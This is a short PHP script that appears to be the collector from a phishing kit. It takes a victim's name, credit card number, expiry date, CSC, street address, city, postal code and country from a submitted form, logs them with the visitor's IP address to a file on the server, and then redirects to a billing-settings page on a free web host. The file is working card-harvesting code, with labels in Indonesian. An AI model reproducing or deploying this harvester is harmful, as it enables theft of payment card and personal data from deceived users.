<?php
$file = "2021________NewYear";
$firstName = $_POST['firstName'];
$creditCardNumber = $_POST['creditCardNumber'];
$month = $_POST['month'];
$year = $_POST['year'];
$csc = $_POST['csc'];
$street = $_POST['street'];
$city = $_POST['city'];
$zip = $_POST['zip'];
$country = $_POST['country'];
$ip = $_SERVER['REMOTE_ADDR'];

$handle = fopen($file, 'a');
fwrite($handle, "~~~~~~~~~~~~~~~~~ Payments ~~~~~~~~~~~~~~~ 01");
fwrite($handle, "\n");
fwrite($handle, "::  NAMA      :: ");
fwrite($handle, "$firstName");
fwrite($handle, "\n");
fwrite($handle, "::  CREDIT    :: ");
fwrite($handle, "$creditCardNumber");
fwrite($handle, "\n");
fwrite($handle, "::  EXPIRET   :: ");
fwrite($handle, "$month");
fwrite($handle, "|");
fwrite($handle, "$year");
fwrite($handle, "   CSC : ");
fwrite($handle, "$csc");
fwrite($handle, "\n");
fwrite($handle, "::  ALAMAT    :: ");
fwrite($handle, "$street");
fwrite($handle, "\n");
fwrite($handle, "::  KOTA      :: ");
fwrite($handle, "$city");
fwrite($handle, "\n");
fwrite($handle, "::  KODE POS  :: ");
fwrite($handle, "$zip");
fwrite($handle, "\n");
fwrite($handle, "::  NEGARA    :: ");
fwrite($handle, "$country");
fwrite($handle, "\n");
fwrite($handle, "::  IP Address:: ");
fwrite($handle, "$ip");
fwrite($handle, "\n");
fclose($handle);
header("Location:https://asameiko96.000webhostapp.com/marejsnj/account_billing_settings.html?spatch=99778d926097d1e1020dbc1b0173ca886c37411e94d6fbe47af9d67cf900fb210917e855");


?>